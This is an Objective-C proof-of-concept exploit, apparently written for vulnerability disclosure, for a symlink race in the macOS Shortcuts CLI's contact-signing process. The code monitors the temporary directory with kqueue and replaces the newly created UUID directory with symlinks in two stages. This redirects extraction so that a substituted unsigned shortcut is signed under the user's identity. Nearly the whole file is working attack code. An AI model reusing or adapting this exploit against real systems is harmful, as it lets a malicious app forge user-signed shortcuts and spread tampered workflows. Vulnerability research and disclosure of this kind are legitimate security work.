//
//  SignedShortcutGenerationInterception-poc.m
//  WorkflowKitSigningRace
//
//  Created by Snoolie Keffaber on 2024/03/28.
//

/*
 * WorkflowKitSigningRace
 *
 * SignedShortcutGenerationInterception
 *
 * The following is a Poc for a vuln
 * very similar to the other one
 * I found & reported in extraction.
 * It allows a malicious application
 * to potentially intercept any
 * shortcuts the user is contact signing
 * and instead sign a different
 * shortcut under the user.
 * This is not for iCloud-signed,
 * as that is server side.
 *
 * In this PoC, it's assumed that
 * the name of the shortcut being
 * signed is "WILL_BE_INTERCEPTED".
 * The PoC also only runs for
 * 20 seconds before it stops
 * scanning when to trigger
 * stage 1.
 *
 * run command:
 * shortcuts sign --input /Users/0xilis/Downloads/0/GitGub/WorkflowKit-Ent-Testing/More/WorkflowKitSigningRace/SigningGenerationRace-Poc/ActiveTesting/WILL_BE_INTERCEPTED.shortcut --output really_really_signed.shortcut
 * (change directory obv)
 */
#import <Foundation/Foundation.h>

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/event.h>
#include <sys/time.h>
#include <errno.h>
#include <string.h>
#include <inttypes.h>

#include <dirent.h>
#include <sys/stat.h>

/*
 * Here, you should put the path to
 * the unsigned shortcut that we're
 * going to intercept with the
 * unsigned shortcut that is being
 * signed.
 */
#define PATH_TO_UNSIGNED_SHORTCUT "/Users/0xilis/Downloads/0/GitGub/WorkflowKit-Ent-Testing/More/WorkflowKitSigningRace/Source/intercept/Shortcut.wflow"

__attribute__((always_inline)) static void stage_0(const char *shortcutsTempPath, const char *pathToUnsignedShortcut, const char *redirectPath, const char *stage2path) {
    /* Stage 0 */
    /* Not part of actual race but just prepares us for it */
    mkdir(redirectPath, 0755);
    mkdir(stage2path, 0755);
    
    const char *stage2ScutsPath = [[NSString stringWithFormat:@"%s/WILL_BE_INTERCEPTED.shortcuts",stage2path]UTF8String];
    mkdir(stage2ScutsPath, 0755);
    
    FILE *fp = fopen(pathToUnsignedShortcut, "r");
    if (!fp) {
        fprintf(stderr,"WorkflowKitSigningRace failed: could not read unsigned shortcut path for stage_0\n");
        exit(1);
    }
    const char *wflowPath = [[NSString stringWithFormat:@"%s/Shortcut.wflow",stage2ScutsPath]UTF8String];
    if (!access(wflowPath, F_OK)) {
        /* File exists, delete it for new */
        remove(wflowPath);
    }
    FILE *fp_writeTo = fopen(wflowPath, "w");
    if (!fp_writeTo) {
        fprintf(stderr,"WorkflowKitSigningRace failed: could not open wflowPath for stage_0\n");
        exit(1);
    }
    /* copy pathToUnsignedShortcut to wflowPath */
    char c = fgetc(fp);
    while (c != EOF) {
        fputc(c, fp_writeTo);
        c = fgetc(fp);
    }
    fclose(fp);
    fclose(fp_writeTo);
    
    printf("stage_0 done\n");
}

__attribute__((always_inline)) static void stage_1(const char *path, const char *redirectPath) {
    /* Stage 1 */
    rmdir(path);
    symlink(redirectPath,path);
}

__attribute__((always_inline)) static void stage_2(const char *symlinkPath, const char *stage2path) {
    unlink(symlinkPath);
    //rmdir(symlinkPath);
    symlink(stage2path,symlinkPath);
    printf("stage 2 done\n");
}

void loop_until_stage_2(const char *directory, const char *stage2path) {
    const char *wflowPath = [[NSString stringWithFormat:@"%s/WILL_BE_INTERCEPTED.shortcuts/Shortcut.wflow",directory]UTF8String];
#define SPAM_ACCESS_CALL 1000000
    for (unsigned int i = 0; i < SPAM_ACCESS_CALL; i++) {
        /* AAExtractArchive should be writing to the symlink at the time anyway to hopefully this is fine, explained in more depth in comment in stage_2() */
        if (!access(wflowPath, F_OK)) {
            stage_2(directory, stage2path);
            NSLog(@"stage 2 finished!!");
            return;
        }
    }
    printf("stage 2 failed to init\n");
    NSLog(@"finish");
}

int main(int argc, char *argv[]) {
    printf("start\n");
    
    /* Get shortcuts temp path */
    NSString *tempDir = NSTemporaryDirectory();
    if (!tempDir) {
        fprintf(stderr,"WorkflowKitSigningRace failed: could not get temporary directory\n");
        return -1;
    }
    
    NSString *shortcutsTempPath = tempDir; /* The Shortcuts CLI tool doesn't use com.apple.shortcuts */
    NSArray *pathsToDirsForRace = [shortcutsTempPath stringsByAppendingPaths:@[@"RedirectExtractionToHere",@"Stage2_Directory"]];
    
    NSString *redirectPathString = pathsToDirsForRace[0];
    NSString *stage2PathString = pathsToDirsForRace[1];
    
    NSLog(@"redirectPath %@",redirectPathString);
    NSLog(@"stage2Path %@",stage2PathString);
    
    const char *redirectPath = [redirectPathString fileSystemRepresentation];
    const char *stage2Path = [stage2PathString fileSystemRepresentation];
    const char *path = [shortcutsTempPath fileSystemRepresentation];
    
    const char *pathToShortcutsOrigExt = [[NSString stringWithFormat:@"%s/WILL_BE_INTERCEPTED.shortcuts",redirectPath]UTF8String];
    const char *pathToOriginalShortcut = [[NSString stringWithFormat:@"%s/WILL_BE_INTERCEPTED.shortcuts/Shortcut.wflow",redirectPath]UTF8String];
    /* removing any shortcut already in our redirect path so we can reliably tell when stage 1 fails */
    remove(pathToOriginalShortcut);
    /* remove WILL_BE_INTERCEPTED.shortcuts if already created or else createDirectory in generateDirectoryRepresentation will fail */
    rmdir(pathToShortcutsOrigExt);
    
    /* Prepare for exploit */
    stage_0(path,PATH_TO_UNSIGNED_SHORTCUT, redirectPath, stage2Path);
    
    /* This won't update the time but PoC only runs for 20 seconds so no need to worry */
    time_t rawtime;
    time(&rawtime);
    
    /* Ugly hack */
    chdir(path);
    
    /* Open a kernel queue. */
    int kq = kqueue();
    if (kq < 0) {
        fprintf(stderr, "WorkflowKitSigningGenerationRace: Could not open kernel queue. Error was %s.\n", strerror(errno));
        exit(1);
    }
    
    /* Open shortcuts temp dir */
    int event_fd = open(path, O_EVTONLY);
    if (event_fd <= 0) {
        fprintf(stderr, "WorkflowKitSigningGenerationRace: The file %s could not be opened for monitoring. Error was %s.\n", path, strerror(errno));
        exit(1);
    }
    
    /* First cycle is 500ms, but all after are 0.5ms */
    struct timespec timeout;
    timeout.tv_sec = 0;
    timeout.tv_nsec = 500000000; /* 500ms */
    
    /* Probably not needed stuff here but eh it works anyways */
    unsigned int vnode_events = NOTE_WRITE | NOTE_EXTEND |                            NOTE_ATTRIB | NOTE_LINK | NOTE_REVOKE;
    struct kevent event_we_are_monitoring[1];
    EV_SET(&event_we_are_monitoring[0], event_fd, EVFILT_VNODE, EV_ADD | EV_CLEAR, vnode_events, 0, 0);
    
    /* Handle events. */
    int alreadyDidStage2 = 0;
    int continue_loop = 40000; /* Monitor for twenty seconds. */
    while (--continue_loop) {
        int event_count = kevent(kq, event_we_are_monitoring, 1, 0, 1, &timeout);
        if (event_count) {
            /* shortcutsTempDir was modified! */
            DIR *dir;
            struct dirent *ent;
            if ((dir = opendir(path)) == 0) {
                fprintf(stderr, "WorkflowKitSigningGenerationRace: opendir() failed in loop\n");
                close(event_fd);
                exit(1);
            }
            
            while ((ent = readdir(dir))) {
                const char *dirName= ent->d_name;
                if (dirName[8] == '-') {
                    /* Was the directory created after PoC? */
                    struct stat dir_info;
                    stat(dirName, &dir_info);
                    time_t modifiedDate = dir_info.st_mtime;
                    if (modifiedDate > rawtime) {
                        /*
                         * Note:
                         *
                         * We are assuming here that
                         * if a directory has '-' for
                         * it's 9th character and
                         * all [NSUUID UUID] named
                         * directories must be
                         * because of WFShortcutPackageFile's
                         * commonInit, which we are also
                         * assuming is for signing rather
                         * than exporting. This is obviously
                         * **BAD**! But it's quick to do,
                         * and this is really just intended
                         * to show off the bug.
                         */
                        printf("Doing race on %s\n",dirName);
                        if (!alreadyDidStage2) {
                            /* Stage 1 */
                            const char *uuidPath = [[NSString stringWithFormat:@"%s/%s",path,dirName]UTF8String];
                            stage_1(uuidPath, redirectPath);
                            loop_until_stage_2(uuidPath, stage2Path);
                            alreadyDidStage2 = 1;
                            if (access(pathToOriginalShortcut, F_OK)) {
                                fprintf(stderr,"WorkflowKitSigningRace failed: stage_1 was too slow\n");
                                closedir(dir);
                                close(event_fd);
                                exit(1);
                            }
                            closedir(dir);
                            close(event_fd);
                            printf("WorkflowKitSigningRace: stopped\n");
                            return 0;
                        }
                    }
                }
            }
            closedir(dir);
        }
    }
    
    printf("end\n");
    return 0;
}
